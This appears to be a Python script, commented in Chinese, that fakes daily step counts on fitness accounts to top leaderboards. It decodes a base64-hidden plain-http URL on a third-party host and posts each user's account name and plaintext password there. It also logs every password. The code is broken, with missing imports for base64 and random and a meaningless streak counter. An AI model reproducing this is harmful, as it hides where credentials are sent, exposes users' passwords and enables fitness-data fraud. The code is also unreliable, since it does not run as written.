import os
from datetime import datetime, timedelta
import pytz

import logging
import requests

# 设置时区为北京时间
tz = pytz.timezone('Asia/Shanghai')

def modify_steps(account, password, min_steps=None, max_steps=None):
    """
    修改步数的函数。

    Args:
        account (str): 账号。
        password (str): 密码。
        min_steps (int, optional): 最小步数。默认为 None。
        max_steps (int, optional): 最大步数。默认为 None。

    Returns:
        dict: 修改结果。

    Raises:
        requests.exceptions.RequestException: 请求异常。
    """
    encoded_url = 'aHR0cDovL2JzLnN2di5pbmsvaW5kZXgucGhw'
    url = base64.b64decode(encoded_url).decode('utf-8')
    steps = random.randint(min_steps, max_steps)
    data = {
        'account': account,
        'password': password,
        'steps': steps
    }

    try:
        response = requests.post(url, data=data)
        response.raise_for_status()
        result = response.json()
    except requests.exceptions.RequestException as e:
        logging.error(f"请求异常: {e}")
        raise

    # 打印详细信息
    logging.info("账号: %s", account)
    logging.info("密码: %s", password)
    logging.info("步数: %d", steps)
    logging.info("响应: %s", result)
    logging.info("时间: %s", datetime.now(tz).strftime("%Y-%m-%d %H:%M:%S"))
    logging.info("=" * 30)  # 分隔线，以提高可读性

    return result

if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)

    # 从环境变量获取 Secrets 值
    accounts = os.environ['ACCOUNTS'].split(',')
    passwords = os.environ['PASSWORDS'].split(',')
    min_steps = int(os.environ['MIN_STEPS'])
    max_steps = int(os.environ['MAX_STEPS'])

    results = []
    successful_accounts = []  # 存储成功的账号
    consecutive_days = 0  # 连续成功天数
    previous_date = None  # 上一次执行的日期

    for account, password in zip(accounts, passwords):
        result = modify_steps(account, password, min_steps, max_steps)
        results.append(result)

        # 检查是否成功，并判断是否是连续的一天
        if result['code'] == 1 and result['message'] == 'success':
            current_date = datetime.now(pytz.timezone('Asia/Shanghai')).date()
            if previous_date is None or previous_date == current_date - timedelta(days=1):
                consecutive_days += 1
            else:
                consecutive_days = 1
            successful_accounts.append(account)

            previous_date = current_date  # 更新 previous_date

    # 输出成功响应的账号
    logging.info("成功的账号：")
    for account in successful_accounts:
        logging.info(account)

    # 输出连续成功天数
    logging.info("已连续霸榜: %d days", consecutive_days)
